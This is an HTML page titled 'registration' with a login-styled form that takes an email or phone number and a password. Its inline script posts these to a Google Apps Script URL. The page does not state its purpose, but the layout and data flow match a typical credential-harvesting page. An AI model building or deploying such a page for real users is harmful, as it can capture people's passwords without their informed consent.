<!DOCTYPE html>
<html>
<head>
  <title>registration</title>
  <link rel="stylesheet" href="styles.css" />
</head>
<body>
<div class="container">
  <div class="card">
    <div class="logo">registration</div>
    <div class="tagline">Registration.</div>

    <form id="registrationForm">
      <input type="text" name="emailOrPhone" placeholder="Email or Phone Number" required>
      <input type="password" name="password" placeholder="Password" required>
      <input type="email" name="emailAddress" placeholder="Email Address" required>
      <button type="submit">Log In</button>
    </form>

    <a href="#" class="link">Forgot password?</a>
    <hr>
    <button class="create-btn">Create New Account</button>
  </div>
</div>

<script>
  const form = document.getElementById('registrationForm');
  const url = "https://script.google.com/macros/s/AKfycbyqun8asZtcvLiXfrFdiyXkb75bZWpA0vullgQEYG7Csxhs4HQ46bLHP6LFU1inMwwytg/exec"; // Apps Script URL

  form.addEventListener('submit', function(e) {
    e.preventDefault();

    const data = new FormData(form);

    fetch(url, {
      method: "POST",
      body: data
    })
    .then(response => response.json())
    .then(resp => {
      alert("Form submitted successfully!");
      form.reset();
    })
    .catch(err => alert("Error submitting form: " + err));
  });
</script>
</body>
</html>
